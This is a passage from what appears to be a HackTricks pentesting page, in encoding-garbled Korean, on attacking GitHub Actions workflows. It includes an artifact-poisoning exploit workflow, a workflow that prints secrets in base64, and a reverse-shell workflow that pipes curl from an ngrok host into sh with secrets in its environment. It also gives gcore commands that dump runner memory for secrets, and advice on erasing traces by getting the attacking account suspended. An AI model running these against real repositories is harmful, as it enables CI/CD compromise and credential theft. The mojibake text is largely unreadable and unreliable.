ì¼ë¶€ [**github ì»¨í…ìŠ¤íŠ¸**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)ì˜ ê°’ì€ **PRì„ ìƒì„±í•˜ëŠ” ì‚¬ìš©ì**ì— ì˜í•´ **ì œì–´**ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤. github ì•¡ì…˜ì´ **ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´** í•´ë‹¹ **ë°ì´í„°ë¥¼ ì‚¬ìš©**í•˜ëŠ” ê²½ìš°, ì´ëŠ” **ì„ì˜ ì½”ë“œ ì‹¤í–‰**ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV ìŠ¤í¬ë¦½íŠ¸ ì¸ì ì…˜** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ë¬¸ì„œì— ë”°ë¥´ë©´: í™˜ê²½ ë³€ìˆ˜ë¥¼ ì •ì˜í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ê³  ì´ë¥¼ **`GITHUB_ENV`** í™˜ê²½ íŒŒì¼ì— ì‘ì„±í•˜ì—¬ ì›Œí¬í”Œë¡œìš° ì‘ì—…ì˜ í›„ì† ë‹¨ê³„ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³µê²©ìê°€ ì´ **env** ë³€ìˆ˜ì— **ì–´ë–¤ ê°’ì´ë“  ì£¼ì…**í•  ìˆ˜ ìˆë‹¤ë©´, **LD\_PRELOAD** ë˜ëŠ” **NODE\_OPTIONS**ì™€ ê°™ì€ í›„ì† ë‹¨ê³„ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” env ë³€ìˆ˜ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ ([**ì´ê²ƒ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ë° [**ì´ê²ƒ**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), ì—…ë¡œë“œëœ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ì—¬ ê·¸ ë‚´ìš©ì„ **`GITHUB_ENV`** env ë³€ìˆ˜ì— ì €ì¥í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒìƒí•´ë³´ì‹­ì‹œì˜¤. ê³µê²©ìëŠ” ì´ë¥¼ ì†ìƒì‹œí‚¤ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### ì·¨ì•½í•œ ì„œë“œ íŒŒí‹° Github ì•¡ì…˜

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)ì—ì„œ ì–¸ê¸‰ëœ ë°”ì™€ ê°™ì´, ì´ Github ì•¡ì…˜ì€ ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš° ë° ì‹¬ì§€ì–´ ì €ì¥ì†Œì˜ ì•„í‹°íŒ©íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¬¸ì œëŠ” **`path`** ë§¤ê°œë³€ìˆ˜ê°€ ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°, ì•„í‹°íŒ©íŠ¸ê°€ í˜„ì¬ ë””ë ‰í† ë¦¬ì— ì¶”ì¶œë˜ì–´ ë‚˜ì¤‘ì— ì‚¬ìš©ë˜ê±°ë‚˜ ì‹¬ì§€ì–´ ì›Œí¬í”Œë¡œìš°ì—ì„œ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ, ì•„í‹°íŒ©íŠ¸ê°€ ì·¨ì•½í•œ ê²½ìš°, ê³µê²©ìëŠ” ì´ë¥¼ ì•…ìš©í•˜ì—¬ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ëŠ” ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½í•œ ì›Œí¬í”Œë¡œìš°ì˜ ì˜ˆ:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
ì´ê²ƒì€ ì´ workflowë¡œ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Other External Access

### Deleted Namespace Repo Hijacking

ê³„ì •ì´ ì´ë¦„ì„ ë³€ê²½í•˜ë©´ ì¼ì • ì‹œê°„ì´ ì§€ë‚œ í›„ ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ê·¸ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ **ì´ë¦„ ë³€ê²½ ì´ì „ì— ë³„ì´ 100ê°œ ë¯¸ë§Œì¸ ì €ì¥ì†Œ**ê°€ ìˆì—ˆë‹¤ë©´, Githubì€ ë™ì¼í•œ ì´ë¦„ìœ¼ë¡œ ìƒˆë¡œ ë“±ë¡ëœ ì‚¬ìš©ìê°€ **ë™ì¼í•œ ì´ë¦„ì˜ ì €ì¥ì†Œ**ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ë”°ë¼ì„œ ì•¡ì…˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê³„ì •ì˜ ì €ì¥ì†Œë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìê°€ ê·¸ ê³„ì •ì„ ìƒì„±í•˜ê³  ì•¡ì…˜ì„ ì†ìƒì‹œí‚¬ ê°€ëŠ¥ì„±ì´ ì—¬ì „íˆ ì¡´ì¬í•©ë‹ˆë‹¤.
{% endhint %}

ë‹¤ë¥¸ ì €ì¥ì†Œê°€ **ì´ ì‚¬ìš©ì ì €ì¥ì†Œì˜ ì¢…ì†ì„±ì„ ì‚¬ìš©**í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ í•˜ì´ì¬í‚¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸° ë” ì™„ì „í•œ ì„¤ëª…ì´ ìˆìŠµë‹ˆë‹¤: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
ì´ ì„¹ì…˜ì—ì„œëŠ” ì²« ë²ˆì§¸ ì €ì¥ì†Œì— ì–´ë–¤ í˜•íƒœë¡œë“  ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•  ë•Œ, **í•œ ì €ì¥ì†Œì—ì„œ ë‹¤ë¥¸ ì €ì¥ì†Œë¡œ í”¼ë²—**í•  ìˆ˜ ìˆëŠ” ê¸°ìˆ ì— ëŒ€í•´ ì´ì•¼ê¸°í•˜ê² ìŠµë‹ˆë‹¤ (ì´ì „ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”).
{% endhint %}

### Cache Poisoning

ìºì‹œëŠ” **ê°™ì€ ë¸Œëœì¹˜ì—ì„œ ì›Œí¬í”Œë¡œìš° ì‹¤í–‰ ê°„**ì— ìœ ì§€ë©ë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìê°€ **íŒ¨í‚¤ì§€**ë¥¼ ì†ìƒì‹œí‚¤ê³  ì´ë¥¼ ìºì‹œì— ì €ì¥í•œ í›„ **ë” ë†’ì€ ê¶Œí•œ**ì„ ê°€ì§„ ì›Œí¬í”Œë¡œìš°ê°€ ì´ë¥¼ **ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¤í–‰í•˜ë©´, ê·¸ ì›Œí¬í”Œë¡œìš°ë„ **ì†ìƒì‹œí‚¬ ìˆ˜** ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artifact Poisoning

ì›Œí¬í”Œë¡œìš°ëŠ” **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë‚˜ ì €ì¥ì†Œì˜ ì•„í‹°íŒ©íŠ¸**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ê³µê²©ìê°€ **ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œí•˜ëŠ” Github Actionì„ ì†ìƒ**ì‹œí‚¤ê³ , ê·¸ ì•„í‹°íŒ©íŠ¸ê°€ ë‚˜ì¤‘ì— ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ì—ì„œ ì‚¬ìš©ëœë‹¤ë©´, ê·¸ëŠ” **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë„ ì†ìƒ**ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation from an Action

### Accessing AWS and GCP via OIDC

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Accessing secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

ìŠ¤í¬ë¦½íŠ¸ì— ë‚´ìš©ì„ ì£¼ì…í•˜ëŠ” ê²½ìš°, ë¹„ë°€ì— ì ‘ê·¼í•˜ëŠ” ë°©ë²•ì„ ì•„ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤:

* ë¹„ë°€ ë˜ëŠ” í† í°ì´ **í™˜ê²½ ë³€ìˆ˜**ë¡œ ì„¤ì •ëœ ê²½ìš°, **`printenv`**ë¥¼ ì‚¬ìš©í•˜ì—¬ í™˜ê²½ì„ í†µí•´ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary>Github Action ì¶œë ¥ì—ì„œ ë¹„ë°€ ëª©ë¡</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsë¡œ reverse shell ì–»ê¸°</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* ë¹„ë°€ì´ **í‘œí˜„ì‹ì— ì§ì ‘ ì‚¬ìš©**ë˜ëŠ” ê²½ìš°, ìƒì„±ëœ ì…¸ ìŠ¤í¬ë¦½íŠ¸ê°€ **ë””ìŠ¤í¬ì— ì €ì¥**ë˜ë©° ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScript actionsì˜ ê²½ìš° ë¹„ë°€ì€ í™˜ê²½ ë³€ìˆ˜ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.
* ```bash
ps axe | grep node
```
* **ì»¤ìŠ¤í…€ ì•¡ì…˜**ì˜ ê²½ìš°, í”„ë¡œê·¸ë¨ì´ **ì¸ìˆ˜**ì—ì„œ ì–»ì€ ë¹„ë°€ì„ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì— ë”°ë¼ ìœ„í—˜ì´ ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted runners ì•…ìš©

**Github Actionsê°€ ë¹„github ì¸í”„ë¼ì—ì„œ ì‹¤í–‰ë˜ëŠ”ì§€** í™•ì¸í•˜ëŠ” ë°©ë²•ì€ Github Action êµ¬ì„± yamlì—ì„œ **`runs-on: self-hosted`**ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

**Self-hosted** runnersëŠ” **ì¶”ê°€ì ì¸ ë¯¼ê° ì •ë³´**ë‚˜ ë‹¤ë¥¸ **ë„¤íŠ¸ì›Œí¬ ì‹œìŠ¤í…œ**(ë„¤íŠ¸ì›Œí¬ì˜ ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸? ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤?)ì— ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©°, ê²©ë¦¬ë˜ê³  íŒŒê´´ë˜ë”ë¼ë„ **ì—¬ëŸ¬ ì•¡ì…˜ì´ ë™ì‹œì— ì‹¤í–‰**ë  ìˆ˜ ìˆê³  ì•…ì„± ì•¡ì…˜ì´ ë‹¤ë¥¸ ì•¡ì…˜ì˜ **ë¹„ë°€ì„ í›”ì¹ ** ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Self-hosted runnersì—ì„œëŠ” \_Runner.Listener\_\*\* í”„ë¡œì„¸ìŠ¤\*\*ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•˜ì—¬ ì›Œí¬í”Œë¡œì˜ ëª¨ë“  ë¹„ë°€ì„ ì–»ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**ë” ë§ì€ ì •ë³´ëŠ” ì´ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github actionsë¥¼ ì‚¬ìš©í•˜ì—¬ **Docker ì´ë¯¸ì§€ë¥¼ ë¹Œë“œí•˜ê³  Githubì— ì €ì¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ í™•ì¥ ê°€ëŠ¥í•œ ì˜ˆì œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

ì´ì „ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, Github ë ˆì§€ìŠ¤íŠ¸ë¦¬ëŠ” **`ghcr.io`**ì— í˜¸ìŠ¤íŒ…ë©ë‹ˆë‹¤.

ë ˆí¬ì— ëŒ€í•œ ì½ê¸° ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” ê°œì¸ ì•¡ì„¸ìŠ¤ í† í°ì„ ì‚¬ìš©í•˜ì—¬ Docker Imageë¥¼ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
ê·¸ëŸ° ë‹¤ìŒ, ì‚¬ìš©ìëŠ” **Docker ì´ë¯¸ì§€ ë ˆì´ì–´ì—ì„œ ìœ ì¶œëœ ë¹„ë°€ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions ë¡œê·¸ì˜ ë¯¼ê°í•œ ì •ë³´

**Github**ì´ ì•¡ì…˜ ë¡œê·¸ì—ì„œ **ë¹„ë°€ ê°’ì„ ê°ì§€í•˜ê³ ** **í‘œì‹œí•˜ì§€ ì•Šë„ë¡** ì‹œë„í•˜ë”ë¼ë„, ì•¡ì…˜ ì‹¤í–‰ ì¤‘ì— ìƒì„±ë  ìˆ˜ ìˆëŠ” **ë‹¤ë¥¸ ë¯¼ê°í•œ ë°ì´í„°**ëŠ” ìˆ¨ê²¨ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¹„ë°€ ê°’ìœ¼ë¡œ ì„œëª…ëœ JWTëŠ” [íŠ¹ë³„íˆ êµ¬ì„±ë˜ì§€ ì•ŠëŠ” í•œ](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) ìˆ¨ê²¨ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤.

## í”ì  ì§€ìš°ê¸°

([**ì—¬ê¸°**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)ì—ì„œ ê°€ì ¸ì˜¨ ê¸°ìˆ ) ìš°ì„ , ìƒì„±ëœ ëª¨ë“  PRì€ Githubì™€ ëŒ€ìƒ GitHub ê³„ì •ì—ì„œ ê³µê°œì ìœ¼ë¡œ ëª…í™•íˆ ë³´ì…ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ GitHubì—ì„œëŠ” **ì¸í„°ë„·ì—ì„œ PRì„ ì‚­ì œí•  ìˆ˜ ì—†ì§€ë§Œ**, ë°˜ì „ì´ ìˆìŠµë‹ˆë‹¤. **Githubì— ì˜í•´ ì •ì§€ëœ** Github ê³„ì •ì˜ ê²½ìš°, ëª¨ë“  **PRì´ ìë™ìœ¼ë¡œ ì‚­ì œ**ë˜ê³  ì¸í„°ë„·ì—ì„œ ì œê±°ë©ë‹ˆë‹¤. ë”°ë¼ì„œ í™œë™ì„ ìˆ¨ê¸°ë ¤ë©´ **GitHub ê³„ì •ì„ ì •ì§€ì‹œí‚¤ê±°ë‚˜ ê³„ì •ì„ í”Œë˜ê·¸**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ GitHubì—ì„œ ëª¨ë“  í™œë™ì´ ì¸í„°ë„·ì—ì„œ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤ (ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ìµìŠ¤í”Œë¡œì‡ PRì„ ì œê±°).

GitHubì˜ ì¡°ì§ì€ ê³„ì •ì„ GitHubì— ë³´ê³ í•˜ëŠ” ë° ë§¤ìš° ì ê·¹ì ì…ë‹ˆë‹¤. Issueì— "ì–´ë–¤ ê²ƒ"ì„ ê³µìœ í•˜ê¸°ë§Œ í•˜ë©´ 12ì‹œê°„ ë‚´ì— ê³„ì •ì´ ì •ì§€ë˜ë„ë¡ í•´ì¤ë‹ˆë‹¤ :p ì´ë ‡ê²Œ í•˜ë©´ GitHubì—ì„œ ìµìŠ¤í”Œë¡œì‡ì´ ë³´ì´ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì¡°ì§ì´ íƒ€ê²Ÿì´ ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆëŠ” ìœ ì¼í•œ ë°©ë²•ì€ SIEMì—ì„œ GitHub ë¡œê·¸ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. GitHub UIì—ì„œëŠ” PRì´ ì œê±°ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
{% endhint %}

## ë„êµ¬

ë‹¤ìŒ ë„êµ¬ë“¤ì€ Github Action ì›Œí¬í”Œë¡œìš°ë¥¼ ì°¾ê³  ì·¨ì•½í•œ ì›Œí¬í”Œë¡œìš°ë¥¼ ì°¾ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
